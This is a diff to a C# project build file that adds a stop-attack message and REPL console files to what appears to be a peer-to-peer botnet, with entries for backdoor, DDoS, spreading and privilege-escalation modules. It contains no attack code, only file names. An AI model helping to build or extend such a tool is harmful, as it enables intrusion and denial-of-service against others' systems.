@@ -66,6 +66,7 @@
     <Compile Include="Network\Protocol\Handlers\System\HelloAckMessageHandler.cs" />
     <Compile Include="Network\Protocol\Handlers\System\PingPongMessageHandler.cs" />
     <Compile Include="Network\Protocol\Messages\Command\BackdoorMessage.cs" />
+    <Compile Include="Network\Protocol\Messages\Command\DosStopAttackMessage.cs" />
     <Compile Include="Network\Protocol\Messages\Command\GetSystemInfo.cs" />
     <Compile Include="Network\Protocol\Messages\Command\DosAttackMessage.cs" />
     <Compile Include="Network\Protocol\Messages\System\HelloAckMessage.cs" />
@@ -100,12 +101,16 @@
     <Compile Include="Network\Protocol\Peers\PeerList.cs" />
     <Compile Include="Network\SFP\F.cs" />
     <Compile Include="RemoveAttribute.cs" />
+    <Compile Include="REPL\CommandCompletion.cs" />
+    <Compile Include="REPL\CommandHistory.cs" />
+    <Compile Include="REPL\CommandLine.cs" />
     <Compile Include="REPL\DebugCommand.cs" />
     <Compile Include="REPL\ExecuteCommand.cs" />
     <Compile Include="REPL\AddPeerCommand.cs" />
     <Compile Include="REPL\CommandReader.cs" />
     <Compile Include="REPL\DDoSCommand.cs" />
     <Compile Include="REPL\BackdoorCommand.cs" />
+    <Compile Include="REPL\VirtualConsole.cs" />
     <Compile Include="Spread\PrivilegeScalation.cs" />
     <Compile Include="System\CommandExecutor.cs" />
     <Compile Include="System\DateTimeProvider.cs" />
